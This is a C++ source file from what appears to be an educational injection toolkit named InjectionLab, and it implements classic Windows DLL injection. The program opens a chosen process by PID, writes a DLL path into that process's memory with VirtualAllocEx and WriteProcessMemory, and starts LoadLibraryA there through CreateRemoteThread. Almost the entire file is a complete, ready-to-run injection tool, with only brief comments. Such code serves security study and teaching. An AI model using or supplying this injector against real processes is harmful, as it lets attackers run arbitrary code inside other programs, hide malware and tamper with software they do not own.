// InjectionLab - Educational Code Injection Toolkit
// injection_dll_loadlibrary.cpp
//
// This example demonstrates classic DLL injection using VirtualAllocEx
// and CreateRemoteThread to call LoadLibraryA in the target process.
//
// It writes the path of a DLL into the memory of the target process,
// and executes LoadLibraryA remotely via CreateRemoteThread.

#include <windows.h>
#include <iostream>
#include <string>

int main() {
    DWORD pid;
    std::string dllPath;

    std::cout << "[>] Enter the PID of the target process: ";
    std::cin >> pid;
    std::cin.ignore(); // Clear newline left in input buffer

    std::cout << "[>] Enter the full path to the DLL to inject: ";
    std::getline(std::cin, dllPath);

    // Open the target process with necessary access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed for PID " << pid
                  << ". Error: " << GetLastError() << "\n";
        return 1;
    }

    // Allocate memory in the target process for the DLL path string
    LPVOID remoteMemory = VirtualAllocEx(
        hProcess,
        nullptr,
        dllPath.length() + 1, // +1 for null terminator
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!remoteMemory) {
        std::cerr << "[-] VirtualAllocEx failed. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Memory allocated at " << remoteMemory << " in target process.\n";

    // Write the DLL path into the allocated memory in the remote process
    BOOL writeResult = WriteProcessMemory(
        hProcess,
        remoteMemory,
        dllPath.c_str(),
        dllPath.length() + 1, // include null terminator
        nullptr
    );

    if (!writeResult) {
        std::cerr << "[-] WriteProcessMemory failed. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] DLL path written to remote process memory.\n";

    // Get the address of LoadLibraryA from kernel32.dll
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );

    if (!loadLibraryAddr) {
        std::cerr << "[-] GetProcAddress for LoadLibraryA failed.\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] LoadLibraryA address found at " << loadLibraryAddr << "\n";

    // Create a remote thread that calls LoadLibraryA(dllPath)
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddr,
        remoteMemory,
        0,
        nullptr
    );

    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Remote thread created. DLL should be loaded in target process.\n";

    // Wait for the remote thread to finish (optional)
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
